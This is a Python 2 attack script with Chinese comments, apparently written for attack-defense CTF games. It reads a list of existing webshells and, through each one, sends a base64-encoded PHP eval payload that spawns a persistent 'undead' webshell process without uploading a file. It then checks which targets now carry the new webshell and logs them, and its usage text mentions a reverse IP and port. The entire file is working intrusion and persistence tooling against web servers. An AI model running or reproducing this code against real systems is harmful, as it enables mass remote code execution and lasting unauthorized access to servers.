#!/usr/bin/python
# coding:utf-8
# 本程序支持在不上传文件的情况下,靶机环境直接生成不死马进程

import sys,requests,base64,re

def loadfile(filepath):
	try : 
		file = open(filepath,"rb")
		content = str(file.read())
		file.close()
		return content
	except : 
		print "File %s Not Found!" %filepath
		sys.exit()

def file_write(filepath,filecontent):
	file = open(filepath,"a")
	file.write(filecontent)
	file.close()

def postshell(url,method,passwd,upload_file,webshell):
	#print url
	#判断shell是否存在
	try :
		res = requests.get(url,timeout=3)
	except : 
		print "[-] %s ERR_CONNECTION_TIMED_OUT" %url
		return 0
	if res.status_code!=200 :
		print "[-] %s Page Not Found!" %url
		return 0

	# 获取上传的不死马的url
	pattern = re.compile(r'(http://(\d+\.\d+\.\d+\.\d+)(:\d+)*/*(.*/)*)(.*\.php)*.*')
	# 分组获取 -- [当前路径, IP, Port, 相对路径, php文件名]
	pwd_path=re.findall(pattern,url)[0][0]

	shell_code = loadfile(upload_file)
	data={}
	# 上传文件
	if method=='get':
		# define your special password as pass
		#data['pass']='elliot@123'
		data[passwd]='@eval(base64_decode($_GET[z0]));'
		data['z0']=base64.b64encode(shell_code)
		try :
			res = requests.get(url,params=data,timeout=2)
			print "[-]%s nofile shell exec Failed!"%pwd_path
		except requests.exceptions.ReadTimeout:
			# print "[+]%s nofile shell seems worked!"%pwd_path
			pass
		except Exception:
			print "%s  something goes WRONG!" %url
		
	elif method=='post':
		# define your special password as pass
		data['pass']='elliot@123'
		data[passwd]='@eval(base64_decode($_POST[z0]));'
		data['z0']=base64.b64encode(shell_code)
		try :
			res = requests.post(url,data=data,timeout=2)
			print "[-]%s nofile shell exec Failed!"%pwd_path
		except requests.exceptions.ReadTimeout:
			# print "[+]%s nofile shell seems worked!"%pwd_path
			pass
		except Exception:
			print "%s  something goes WRONG!" %url
	
	# 检验是否成功生成新的webshell
	# 获取新生成的小马路径
	pwd_path1 = pwd_path + webshell
	verify = requests.get(pwd_path1,timeout=2)
	# 记录成功生成webshell的地址
	if verify.status_code==200:
		print "%s  webshell generated!" %pwd_path1
		file_write("./Wowoooo!!!.txt", "%s  webshell generated!\n" %pwd_path1)
	else:
		print "%s  webshell NOT work! plz check the webshell name" %pwd_path1

if __name__ == '__main__':
	# 获取系统输入
	if len(sys.argv) != 3:
		print "[*] Usage : "
		print "\tpython master.py [no_file_shell] [webshell]"
		print "[*] Explain : "
		print "\tno_file_shell:\tundead shell without using script tags <?..?>, which looks like php -r"
		print "\twebshell:\tnew webshell filename, which ALREADY modified in undead.php by $file"
		print "\n[*] ATTENTION : "
		print "\tDO modify the reverse IP and PORT!!!\n"
		exit(1)
	upload_file = sys.argv[1]
	webshell = sys.argv[2]

	# 存放webshell的文件
	shellstr=loadfile("./webshell.txt")
	list = shellstr.split("\r\n")
	#print str(list)
	i = 0
	url={}
	passwd={}
	method={}
	for data in list:
		if data:
			ls = data.split(",")
			method_tmp = str(ls[1])
			method_tmp = method_tmp.lower()
			if method_tmp=='post' or method_tmp=='get':
				url[i]=str(ls[0])
				method[i]=method_tmp
				passwd[i]=str(ls[2])
				i+=1
			else :
				print "[-] %s request method error!" %(str(ls[0]))
		else : 
			pass

	for j in range(len(url)):
		#调用执行命令的模块
		#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])
		postshell(url=url[j],method=method[j],passwd=passwd[j],upload_file=upload_file,webshell=webshell)
	file_write("./Wowoooo!!!.txt","\n\n")
	print "\nAll Finished!"
